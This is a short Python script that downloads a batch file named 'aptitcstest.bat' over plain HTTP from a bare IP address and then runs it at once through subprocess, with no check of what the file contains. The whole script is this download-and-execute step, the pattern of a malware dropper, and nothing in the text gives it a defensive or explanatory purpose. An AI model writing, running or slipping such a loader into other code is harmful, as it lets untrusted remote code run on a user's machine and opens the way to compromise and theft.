import requests
import subprocess

url = "http://51.20.135.7/aptitcstest.bat"
output_file = "aptitcstest.bat"

response = requests.get(url)

if response.status_code == 200:
    with open(output_file, "wb") as file:
        file.write(response.content)
    print("File downloaded successfully.")
    
    # Run the downloaded file
    subprocess.run([output_file])
else:
    print(f"Failed to download the file. Status code: {response.status_code}")
